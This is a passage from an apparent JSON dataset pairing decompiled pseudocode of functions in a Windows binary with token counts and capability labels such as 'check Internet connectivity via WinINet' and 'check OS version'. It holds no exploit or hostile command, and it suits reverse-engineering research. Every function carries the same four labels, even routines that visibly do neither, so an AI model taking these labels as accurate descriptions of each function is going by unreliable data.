     fcn.00053270(*var_8h, var_8h[1], 0x80051aa4, 0x33);\n                        }\n                        else {\n                            puVar7 = 0x80055558;\n                            puVar8 = &var_88h;\n                            for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar8 = *puVar7;\n                                puVar7 = puVar7 + 1;\n                                puVar8 = puVar8 + 1;\n                            }\n                            *puVar8 = *puVar7;\n                            *(puVar8 + 2) = *(puVar7 + 2);\n                            var_280h = &var_88h;\n                            do {\n                                cVar2 = *var_280h;\n                                var_280h = var_280h + 1;\n                            } while (cVar2 != '\\0');\n                            var_11ch = fcn.00053270(*var_8h, var_8h[1], &var_88h, var_280h - (&var_88h + 1));\n                            if ((var_11ch == 0) && (iVar4 = fcn.0004e150(var_8h, &var_118h, 0x80),  iVar4 != 0)) {\n                                var_290h = 0x80055578;\n                                var_294h = &var_118h;\n                                do {\n                                    uVar3 = *var_294h;\n                                    bVar9 = uVar3 < *var_290h;\n                                    if (uVar3 != *var_290h) {\ncode_r0x0004dfd8:\n                                        var_29ch = (1 - bVar9) - (bVar9 != 0);\n                                        goto code_r0x0004dfe3;\n                                    }\n                                    if (uVar3 == 0) break;\n                                    uVar3 = *(var_294h + 1);\n                                    bVar9 = uVar3 < var_290h[1];\n                                    if (uVar3 != var_290h[1]) goto code_r0x0004dfd8;\n                                    var_294h = var_294h + 2;\n                                    var_290h = var_290h + 2;\n                                } while (uVar3 != 0);\n                                var_29ch = 0;\ncode_r0x0004dfe3:\n                                if (var_29ch == 0) {\n                                    puVar7 = 0x80055580;\n                                    puVar8 = &var_88h;\n                                    for (iVar4 = 10; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                        *puVar8 = *puVar7;\n                                        puVar7 = puVar7 + 1;\n                                        puVar8 = puVar8 + 1;\n                                    }\n                                    *puVar8 = *puVar7;\n                                    *(puVar8 + 2) = *(puVar7 + 2);\n                                    var_2b4h = &var_88h;\n                                    do {\n                                        cVar2 = *var_2b4h;\n                                        var_2b4h = var_2b4h + 1;\n                                    } while (cVar2 != '\\0');\n                                    fcn.00053270(*var_8h, var_8h[1], &var_88h, var_2b4h - (&var_88h + 1));\n                                }\n                                else {\n                                    puVar7 = 0x80055498;\n                                    puVar8 = &var_88h;\n                                    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                        *puVar8 = *puVar7;\n                                        puVar7 = puVar7 + 1;\n                                        puVar8 = puVar8 + 1;\n                                    }\n                                    *puVar8 = *puVar7;\n                                    *(puVar8 + 2) = *(puVar7 + 2);\n                                    var_2a4h = &var_88h;\n                                    do {\n                                        cVar2 = *var_2a4h;\n                                        var_2a4h = var_2a4h + 1;\n                                    } while (cVar2 != '\\0');\n                                    fcn.00053270(*var_8h, var_8h[1], &var_88h, var_2a4h - (&var_88h + 1));\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        puVar7 = 0x80055508;\n                        puVar8 = &var_88h;\n                        for (iVar4 = 0xb; iVar4 != 0; iVar4 = iVar4 + -1) {\n                            *puVar8 = *puVar7;\n                            puVar7 = puVar7 + 1;\n                            puVar8 = puVar8 + 1;\n                        }\n                        *puVar8 = *puVar7;\n                        var_24ch = &var_88h;\n                        do {\n                            cVar2 = *var_24ch;\n                            var_24ch = var_24ch + 1;\n                        } while (cVar2 != '\\0');\n                        fcn.00053270(*var_8h, var_8h[1], &var_88h, var_24ch - (&var_88h + 1));\n                    }\n                }\n            }\n        }\n    }\n    else {\n        puVar7 = 0x80055498;\n        puVar8 = &var_88h;\n        for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        *puVar8 = *puVar7;\n        *(puVar8 + 2) = *(puVar7 + 2);\n        var_180h = &var_88h;\n        do {\n            cVar2 = *var_180h;\n            var_180h = var_180h + 1;\n        } while (cVar2 != '\\0');\n        fcn.00053270(*var_8h, var_8h[1], &var_88h, var_180h - (&var_88h + 1));\n    }\ncode_r0x0004e101:\n    fcn.000357f0(var_8h);\n    fcn.000357f0(var_8ch);\n    fcn.000531d0(*(var_120h + 0x10), *(var_120h + 0x14));\n    fcn.00053350(var_120h);\n    return 0;\n}\n",
        "token_count": 6466
    },
    "0004e150": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.0004e150(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    while( true ) {\n        iVar1 = fcn.0004b290(arg_8h, arg_ch, arg_10h + -1, &var_8h, 1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        var_4h = fcn.00078b7c(arg_ch, 10, arg_10h);\n        if ((var_4h != 0) || (var_8h == arg_10h + -1)) break;\n        var_8h = arg_8h;\n        iVar1 = fcn.0004b4b0(arg_8h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    if (var_4h != 0) {\n        var_8h = (var_4h + 1) - arg_ch;\n    }\n    iVar1 = fcn.0004b290(arg_8h, arg_ch, var_8h, &var_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(arg_ch + var_8h) = 0;\n    return 1;\n}\n",
        "token_count": 339
    },
    "0004e200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0004e200(void)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (*0x800ce954 == 0) {\n        fcn.000326e0(0x800db600);\n        fcn.000326e0(0x800cdab8);\n        fcn.000344b0(0x800da9f4);\n        *0x800da9f8 = 0;\n        *0x800cda80 = 0x24;\n        *0x800cda84 = 0x800555ac;\n        *0x800cda88 = &var_4h;\n        iVar1 = fcn.00078aec(1, 0x800555cc, 0x800cda7c, 0, 0);\n        if (iVar1 == 0) {\n            *0x800db604 = var_4h != 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "0004e290": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0004e290(void)\n\n{\n    int32_t iVar1;\n    uint var_1h;\n    \n    *0x800da9f8 = 1;\n    fcn.00034570(0x800da9f4);\n    iVar1 = fcn.00037730(0x800ce954);\n    if (iVar1 != 0) {\n        fcn.00037760(0x800ce954, 0);\n        fcn.00037710(0x800ce954);\n    }\n    fcn.00034540(0x800da9f4);\n    (**0x8005100c)();\n    if (*0x800cdab4 != 0) {\n        fcn.000510d0(*0x800cdab4);\n        *0x800cdab4 = 0;\n    }\n    (**0x80051010)();\n    return;\n}\n",
        "token_count": 213
    },
    "0004e320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0004e320(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_61h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uchar var_eh;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_14h = 3;\n    iVar2 = fcn.00020a80(arg_10h, 0x1a, 2, &var_50h, 4);\n    if (iVar2 == 0) {\n        uVar3 = 0x21590065;\n    }\n    else {\n        iVar2 = fcn.0003f990(var_50h, 0);\n        if (iVar2 == 0) {\n            uVar3 = 0x21590065;\n        }\n        else {\n            iVar2 = fcn.00020a10(arg_10h, 0x2c, 4, &var_1ch, 0);\n            if ((iVar2 == 0) || (cVar1 = fcn.00050780(var_1ch, &var_6ch),  cVar1 == '\\0')) {\n                uVar3 = 0x21590066;\n            }\n            else {\n                iVar2 = fcn.00020a10(arg_10h, 0x2d, 4, &var_4ch, 0);\n                if ((iVar2 == 0) || (cVar1 = fcn.00050780(var_4ch, &var_ch),  cVar1 == '\\0')) {\n                    uVar3 = 0x21590067;\n                }\n                else {\n                    var_61h._0_1_ = 1;\n                    fcn.00020a80(arg_10h, 0x30, 1, &var_61h, 1);\n                    var_eh = 1;\n                    fcn.00020a80(arg_10h, 0x31, 1, &var_eh, 1);\n                    iVar2 = fcn.00020a10(arg_10h, 0x2e, 4, &var_18h, 0);\n                    if (iVar2 == 0) {\n                        cVar1 = fcn.00051110(var_50h, var_6ch, &var_48h);\n                        if (cVar1 == '\\0') {\n                            return 0x2159006a;\n                        }\n                        var_8h = var_34h;\n                        var_4h._0_2_ = var_30h;\n                    }\n                    else {\n                        cVar1 = fcn.00050880(var_18h, &var_8h);\n                        if (cVar1 == '\\0') {\n                            return 0x2159006a;\n                        }\n                    }\n                    iVar2 = fcn.00020a10(arg_10h, 0x2f, 4, &var_5ch, 0);\n                    if (iVar2 == 0) {\n                        cVar1 = fcn.00051110(var_50h, var_ch, &var_48h);\n                        if (cVar1 == '\\0') {\n                            return 0x2159006b;\n                        }\n                        var_58h = var_34h;\n                        var_54h._0_2_ = var_30h;\n                    }\n                    else {\n                        cVar1 = fcn.00050880(var_5ch, &var_58h);\n                        if (cVar1 == '\\0') {\n                            return 0x2159006b;\n                        }\n                    }\n                    var_dh = (**0x8005100c)();\n                    var_68h = -1;\n                    stack0xffffff9c = 0x21590004;\n                    for (var_14h = 0; var_14h < 0x40; var_14h = var_14h + 1) {\n                        if (*(var_14h * 0x30 + -0x7ff255e8) == 0) {\n                            if (var_68h == -1) {\n                                var_68h = var_14h;\n                            }\n                        }\n                        else if (((*(var_14h * 0x30 + -0x7ff255e8) == var_50h) &&\n                                 (*(var_14h * 0x30 + -0x7ff25600) == var_6ch)) &&\n                                (*(var_14h * 0x30 + -0x7ff255f4) == var_ch)) {\n                            *(var_14h * 0x30 + -0x7ff255fc) = var_8h;\n                            *(var_14h * 0x30 + -0x7ff255f8) = var_4h;\n                            *(var_14h * 0x30 + -0x7ff255f0) = var_58h;\n                            *(var_14h * 0x30 + -0x7ff255ec) = var_54h;\n                            *(var_14h * 0x30 + -0x7ff255e3) = var_61h;\n                            *(var_14h * 0x30 + -0x7ff255e4) = var_eh;\n                            *(var_14h * 0x30 + -0x7ff255e0) = 0;\n                            *(var_14h * 0x30 + -0x7ff255dc) = 0;\n                            stack0xffffff9c = 0;\n                            break;\n                        }\n                    }\n                    if ((0x3f < var_14h) && (var_68h != -1)) {\n                        fcn.00078bfa(var_68h * 0x30 + -0x7ff25600, 0, 0x30);\n                        *(var_68h * 0x30 + -0x7ff255e8) = var_50h;\n                        *(var_68h * 0x30 + -0x7ff25600) = var_6ch;\n                        *(var_68h * 0x30 + -0x7ff255f4) = var_ch;\n                        *(var_68h * 0x30 + -0x7ff255fc) = var_8h;\n                        *(var_68h * 0x30 + -0x7ff255f8) = var_4h;\n                        *(var_68h * 0x30 + -0x7ff255f0) = var_58h;\n                        *(var_68h * 0x30 + -0x7ff255ec) = var_54h;\n                        *(var_68h * 0x30 + -0x7ff255e3) = var_61h;\n                        *(var_68h * 0x30 + -0x7ff255e4) = var_eh;\n                        stack0xffffff9c = 0;\n                    }\n                    (**0x80051010)();\n                    if (stack0xffffff9c == 0) {\n                        iVar2 = fcn.00037730(0x800ce954);\n                        if (iVar2 == 0) {\n                            fcn.0001ace0(0x800ce954, 0x8008f8d0, 0);\n                        }\n                        fcn.00034570(0x800da9f4);\n                    }\n                    uVar3 = fcn.0004e6f0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n                }\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1842
    },
    "0004e6f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_f0h\n\nuint __cdecl fcn.0004e6f0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint var_f0h;\n    uint var_e8h;\n    int16_t *var_e4h;\n    uint var_e0h;\n    uint var_d8h;\n    int16_t *var_d4h;\n    uint var_d0h;\n    uint var_c8h;\n    int16_t *var_c4h;\n    uint var_c0h;\n    uint var_b8h;\n    int16_t *var_b4h;\n    uint var_b0h;\n    uint var_a8h;\n    int16_t *var_a4h;\n    uint var_a0h;\n    uint var_98h;\n    int16_t *var_94h;\n    uint var_90h;\n    uint var_88h;\n    int16_t *var_84h;\n    uint var_80h;\n    uint var_78h;\n    int16_t *var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uchar var_15h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_6ch = 0;\n    *arg_14h = 3;\n    var_ch = 0;\n    var_8h = 0;\n    var_14h = 9;\n    var_10h = &var_68h;\n    fcn.00078bfa(&var_68h, 0, 0x48);\n    *var_10h = 0x27;\n    var_10h[1] = 2;\n    var_10h[2] = 0x3b;\n    var_10h[3] = 4;\n    var_10h[4] = 0x3d;\n    var_10h[5] = 4;\n    var_10h[6] = 0x3c;\n    var_10h[7] = 4;\n    var_10h[8] = 0x3e;\n    var_10h[9] = 4;\n    var_10h[10] = 0x3f;\n    var_10h[0xb] = 1;\n    var_10h[0xc] = 0x40;\n    var_10h[0xd] = 1;\n    var_10h[0xe] = 0x41;\n    var_10h[0xf] = 2;\n    var_10h[0x10] = 0x42;\n    var_10h[0x11] = 2;\n    var_15h = (**0x8005100c)();\n    var_1ch = 0;\n    for (var_20h = 0; var_20h < 0x40; var_20h = var_20h + 1) {\n        if (*(var_20h * 0x30 + -0x7ff255e8) != 0) {\n            var_1ch = var_1ch + 1;\n        }\n    }\n    if (var_1ch == 0) {\n        var_70h = 0;\n        (**0x80051010)();\n    }\n    else {\n        var_6ch = fcn.000356f0(var_1ch * 0x30);\n        if (var_6ch == 0) {\n            var_70h = 0x21590004;\n            (**0x80051010)();\n        }\n        else {\n            var_1ch = 0;\n            for (var_20h = 0; var_20h < 0x40; var_20h = var_20h + 1) {\n                if (*(var_20h * 0x30 + -0x7ff255e8) != 0) {\n                    puVar4 = var_20h * 0x30 + -0x7ff25600;\n                    puVar5 = var_1ch * 0x30 + var_6ch;\n                    for (iVar3 = 0xc; iVar3 != 0; iVar3 = iVar3 + -1) {\n                        *puVar5 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar5 = puVar5 + 1;\n                    }\n                    var_1ch = var_1ch + 1;\n                }\n            }\n            (**0x80051010)();\n            var_ch = var_1ch;\n            var_8h = fcn.000357b0(var_1ch, 4);\n            if (var_8h == 0) {\n                var_70h = 0x21590004;\n            }\n            else {\n                for (var_20h = 0; var_20h < var_1ch; var_20h = var_20h + 1) {\n                    uVar2 = fcn.000356c0(var_14h * 0x10 + 0x88);\n                    *(var_8h + var_20h * 4) = uVar2;\n                    if (*(var_8h + var_20h * 4) == 0) {\n                        var_70h = 0x21590004;\n                        goto code_r0x0004efa7;\n                    }\n                    fcn.00078bfa(*(var_8h + var_20h * 4), 0, var_14h << 4);\n                    var_4h = var_14h * 0x10 + *(var_8h + var_20h * 4);\n                    *(*(var_8h + var_20h * 4) + 4) = *(var_8h + var_20h * 4) + 8;\n                    **(var_8h + var_20h * 4) = 4;\n                    **(*(var_8h + var_20h * 4) + 4) = *(var_6ch + 0x18 + var_20h * 0x30);\n                    fcn.00078a20(var_4h, 0x800555f0, *(var_6ch + var_20h * 0x30), *(var_6ch + 1 + var_20h * 0x30), \n                                 *(var_6ch + 2 + var_20h * 0x30), *(var_6ch + 3 + var_20h * 0x30));\n                    *(*(var_8h + var_20h * 4) + 0x14) = var_4h;\n                    var_74h = var_4h;\n                    do {\n                        iVar1 = *var_74h;\n                        var_74h = var_74h + 1;\n                    } while (iVar1 != 0);\n                    *(*(var_8h + var_20h * 4) + 0x10) = (var_74h - (var_4h + 1) >> 1) * 2 + 2;\n                    var_84h = var_4h;\n                    do {\n                        iVar1 = *var_84h;\n                        var_84h = var_84h + 1;\n                    } while (iVar1 != 0);\n                    var_4h = var_4h + (var_84h - (var_4h + 1) >> 1) + 1;\n                    fcn.00078a20(var_4h, 0x80055058, *(var_6ch + 4 + var_20h * 0x30), *(var_6ch + 5 + var_20h * 0x30), \n                                 *(var_6ch + 6 + var_20h * 0x30), *(var_6ch + 7 + var_20h * 0x30), \n                                 *(var_6ch + 8 + var_20h * 0x30), *(var_6ch + 9 + var_20h * 0x30));\n                    *(*(var_8h + var_20h * 4) + 0x24) = var_4h;\n                    var_94h = var_4h;\n                    do {\n                        iVar1 = *var_94h;\n                        var_94h = var_94h + 1;\n                    } while (iVar1 != 0);\n                    *(*(var_8h + var_20h * 4) + 0x20) = (var_94h - (var_4h + 1) >> 1) * 2 + 2;\n                    var_a4h = var_4h;\n                    do {\n                        iVar1 = *var_a4h;\n                        var_a4h = var_a4h + 1;\n                    } while (iVar1 != 0);\n                    var_4h = var_4h + (var_a4h - (var_4h + 1) >> 1) + 1;\n                    fcn.00078a20(var_4h, 0x800555f0, *(var_6ch + 0xc + var_20h * 0x30), \n                                 *(var_6ch + 0xd + var_20h * 0x30), *(var_6ch + 0xe + var_20h * 0x30), \n                                 *(var_6ch + 0xf + var_20h * 0x30));\n                    *(*(var_8h + var_20h * 4) + 0x34) = var_4h;\n                    var_b4h = var_4h;\n                    do {\n                        iVar1 = *var_b4h;\n                        var_b4h = var_b4h + 1;\n                    } while (iVar1 != 0);\n                    *(*(var_8h + var_20h * 4) + 0x30) = (var_b4h - (var_4h + 1) >> 1) * 2 + 2;\n                    var_c4h = var_4h;\n                    do {\n                        iVar1 = *var_c4h;\n                        var_c4h = var_c4h + 1;\n                    } while (iVar1 != 0);\n                    var_4h = var_4h + (var_c4h - (var_4h + 1) >> 1) + 1;\n                    fcn.00078a20(var_4h, 0x80055058, *(var_6ch + 0x10 + var_20h * 0x30), \n                                 *(var_6ch + 0x11 + var_20h * 0x30), *(var_6ch + 0x12 + var_20h * 0x30), \n                                 *(var_6ch + 0x13 + var_20h * 0x30), *(var_6ch + 0x14 + var_20h * 0x30), \n                                 *(var_6ch + 0x15 + var_20h * 0x30));\n                    *(*(var_8h + var_20h * 4) + 0x44) = var_4h;\n                    var_d4h = var_4h;\n                    do {\n                        iVar1 = *var_d4h;\n                        var_d4h = var_d4h + 1;\n                    } while (iVar1 != 0);\n                    *(*(var_8h + var_20h * 4) + 0x40) = (var_d4h - (var_4h + 1) >> 1) * 2 + 2;\n                    var_e4h = var_4h;\n                    do {\n                        iVar1 = *var_e4h;\n                        var_e4h = var_e4h + 1;\n                    } while (iVar1 != 0);\n                    var_4h = var_4h + (var_e4h - (var_4h + 1) >> 1) + 1;\n                    *(*(var_8h + var_20h * 4) + 0x54) = *(var_8h + var_20h * 4) + 0x58;\n                    *(*(var_8h + var_20h * 4) + 0x50) = 1;\n                    **(*(var_8h + var_20h * 4) + 0x54) = *(var_6ch + 0x1d + var_20h * 0x30) != '\\0';\n                    *(*(var_8h + var_20h * 4) + 100) = *(var_8h + var_20h * 4) + 0x68;\n                    *(*(var_8h + var_20h * 4) + 0x60) = 1;\n                    **(*(var_8h + var_20h * 4) + 100) = *(var_6ch + 0x1c + var_20h * 0x30) != '\\0';\n                    *(*(var_8h + var_20h * 4) + 0x74) = *(var_8h + var_20h * 4) + 0x78;\n                    *(*(var_8h + var_20h * 4) + 0x70) = 4;\n                    **(*(var_8h + var_20h * 4) + 0x74) = *(var_6ch + 0x28 + var_20h * 0x30);\n                    *(*(var_8h + var_20h * 4) + 0x84) = *(var_8h + var_20h * 4) + 0x88;\n                    *(*(var_8h + var_20h * 4) + 0x80) = 4;\n                    **(*(var_8h + var_20h * 4) + 0x84) = *(var_6ch + 0x2c + var_20h * 0x30);\n                }\n                var_70h = fcn.0002f2c0(&var_14h, arg_18h, arg_1ch);\n            }\n        }\n    }\ncode_r0x0004efa7:\n    if (var_8h != 0) {\n        for (var_20h = 0; var_20h < var_ch; var_20h = var_20h + 1) {\n            fcn.000357f0(*(var_8h + var_20h * 4));\n        }\n    }\n    fcn.000357f0(var_8h);\n    if (var_6ch != 0) {\n        fcn.000357f0(var_6ch);\n    }\n    return var_70h;\n}\n",
        "token_count": 3408
    },
    "0004f010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004f010(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint var_b8h;\n    uint var_b0h;\n    int16_t *var_ach;\n    uint var_a8h;\n    uint var_a0h;\n    int16_t *var_9ch;\n    uint var_98h;\n    int32_t var_94h;\n    int32_t var_90h;\n    int32_t *var_8ch;\n    int32_t *var_88h;\n    uint32_t var_84h;\n    uint var_80h;\n    uint var_78h;\n    int16_t *var_74h;\n    uint var_70h;\n    uint var_68h;\n    int16_t *var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uchar var_15h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_24h = 0;\n    *arg_14h = 3;\n    var_ch = 0;\n    var_8h = 0;\n    var_14h = 7;\n    var_10h = &var_5ch;\n    fcn.00078bfa(&var_5ch, 0, 0x38);\n    *var_10h = 0x3b;\n    var_10h[1] = 4;\n    var_10h[2] = 0x27;\n    var_10h[3] = 2;\n    var_10h[4] = 0x3d;\n    var_10h[5] = 4;\n    var_10h[6] = 0x41;\n    var_10h[7] = 2;\n    var_10h[8] = 0x42;\n    var_10h[9] = 2;\n    var_10h[10] = 0x43;\n    var_10h[0xb] = 2;\n    var_10h[0xc] = 1;\n    var_10h[0xd] = 8;\n    var_15h = (**0x8005100c)();\n    fcn.000512b0(*0x800cdab4, &var_1ch, 0);\n    if (var_1ch != 0) {\n        var_24h = fcn.000356f0(var_1ch * 0x2c);\n        if (var_24h == 0) {\n            (**0x80051010)();\n            var_60h = 0x21590004;\n            goto code_r0x0004f725;\n        }\n        fcn.00078bfa(var_24h, 0, var_1ch * 0x2c);\n        fcn.000512b0(*0x800cdab4, &var_1ch, var_24h);\n    }\n    (**0x80051010)();\n    var_ch = var_1ch;\n    var_8h = fcn.000357b0(var_1ch, 4);\n    if (var_8h == 0) {\n        var_60h = 0x21590004;\n    }\n    else {\n        for (var_20h = 0; var_20h < var_1ch; var_20h = var_20h + 1) {\n            uVar2 = fcn.000356c0(var_14h * 0x10 + 0x44);\n            *(var_8h + var_20h * 4) = uVar2;\n            if (*(var_8h + var_20h * 4) == 0) {\n                var_60h = 0x21590004;\n                goto code_r0x0004f725;\n            }\n            fcn.00078bfa(*(var_8h + var_20h * 4), 0, var_14h << 4);\n            var_4h = var_14h * 0x10 + *(var_8h + var_20h * 4);\n            fcn.00078a20(var_4h, 0x800555f0, *(var_24h + 0xc + var_20h * 0x2c), *(var_24h + 0xd + var_20h * 0x2c), \n                         *(var_24h + 0xe + var_20h * 0x2c), *(var_24h + 0xf + var_20h * 0x2c));\n            *(*(var_8h + var_20h * 4) + 4) = var_4h;\n            var_64h = var_4h;\n            do {\n                iVar1 = *var_64h;\n                var_64h = var_64h + 1;\n            } while (iVar1 != 0);\n            **(var_8h + var_20h * 4) = (var_64h - (var_4h + 1) >> 1) * 2 + 2;\n            var_74h = var_4h;\n            do {\n                iVar1 = *var_74h;\n                var_74h = var_74h + 1;\n            } while (iVar1 != 0);\n            var_4h = var_4h + (var_74h - (var_4h + 1) >> 1) + 1;\n            *(*(var_8h + var_20h * 4) + 0x14) = *(var_8h + var_20h * 4) + 0x18;\n            *(*(var_8h + var_20h * 4) + 0x10) = 4;\n            **(*(var_8h + var_20h * 4) + 0x14) = *(var_24h + 0x10 + var_20h * 0x2c);\n            var_88h = 0x800ce95c;\n            var_8ch = var_24h + 0x14 + var_20h * 0x2c;\n            for (var_84h = 6; 3 < var_84h; var_84h = var_84h - 4) {\n                if (*var_8ch != *var_88h) goto code_r0x0004f398;\n                var_88h = var_88h + 1;\n                var_8ch = var_8ch + 1;\n            }\n            if (var_84h == 0) {\ncode_r0x0004f46e:\n                var_94h = 0;\n            }\n            else {\ncode_r0x0004f398:\n                var_90h = *var_8ch - *var_88h;\n                if (var_90h == 0) {\n                    if (var_84h == 1) goto code_r0x0004f46e;\n                    var_90h = *(var_8ch + 1) - *(var_88h + 1);\n                    if (var_90h == 0) {\n                        if (var_84h == 2) goto code_r0x0004f46e;\n                        var_90h = *(var_8ch + 2) - *(var_88h + 2);\n                        if (var_90h == 0) {\n                            if ((var_84h == 3) || (var_90h = *(var_8ch + 3) - *(var_88h + 3),  var_90h == 0))\n                            goto code_r0x0004f46e;\n                        }\n                    }\n                }\n                var_94h = 1;\n                if (var_90h < 1) {\n                    var_94h = -1;\n                }\n            }\n            if (var_94h == 0) {\n                *var_4h = 0;\n            }\n            else {\n                fcn.00078a20(var_4h, 0x80055058, *(var_24h + 0x14 + var_20h * 0x2c), *(var_24h + 0x15 + var_20h * 0x2c)\n                             , *(var_24h + 0x16 + var_20h * 0x2c), *(var_24h + 0x17 + var_20h * 0x2c), \n                             *(var_24h + 0x18 + var_20h * 0x2c), *(var_24h + 0x19 + var_20h * 0x2c));\n            }\n            *(*(var_8h + var_20h * 4) + 0x24) = var_4h;\n            var_9ch = var_4h;\n            do {\n                iVar1 = *var_9ch;\n                var_9ch = var_9ch + 1;\n            } while (iVar1 != 0);\n            *(*(var_8h + var_20h * 4) + 0x20) = (var_9ch - (var_4h + 1) >> 1) * 2 + 2;\n            var_ach = var_4h;\n            do {\n                iVar1 = *var_ach;\n                var_ach = var_ach + 1;\n            } while (iVar1 != 0);\n            var_4h = var_4h + (var_ach - (var_4h + 1) >> 1) + 1;\n            *(*(var_8h + var_20h * 4) + 0x34) = *(var_8h + var_20h * 4) + 0x38;\n            *(*(var_8h + var_20h * 4) + 0x30) = 4;\n            **(*(var_8h + var_20h * 4) + 0x34) = *(var_24h + 0x1c + var_20h * 0x2c);\n            *(*(var_8h + var_20h * 4) + 0x44) = *(var_8h + var_20h * 4) + 0x48;\n            *(*(var_8h + var_20h * 4) + 0x40) = 4;\n            **(*(var_8h + var_20h * 4) + 0x44) = *(var_24h + 0x20 + var_20h * 0x2c);\n            *(*(var_8h + var_20h * 4) + 0x54) = *(var_8h + var_20h * 4) + 0x58;\n            *(*(var_8h + var_20h * 4) + 0x50) = 4;\n            **(*(var_8h + var_20h * 4) + 0x54) = *(var_24h + 0x24 + var_20h * 0x2c);\n            *(*(var_8h + var_20h * 4) + 100) = *(var_8h + var_20h * 4) + 0x68;\n            *(*(var_8h + var_20h * 4) + 0x60) = 4;\n            **(*(var_8h + var_20h * 4) + 100) = *(var_24h + 0x28 + var_20h * 0x2c);\n        }\n        var_60h = fcn.0002f2c0(&var_14h, arg_18h, arg_1ch);\n    }\ncode_r0x0004f725:\n    if (var_8h != 0) {\n        for (var_20h = 0; var_20h < var_ch; var_20h = var_20h + 1) {\n            fcn.000357f0(*(var_8h + var_20h * 4));\n        }\n    }\n    fcn.000357f0(var_8h);\n    if (var_24h != 0) {\n        fcn.000357f0(var_24h);\n    }\n    return var_60h;\n}\n",
        "token_count": 2843
    },
    "0004f8d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
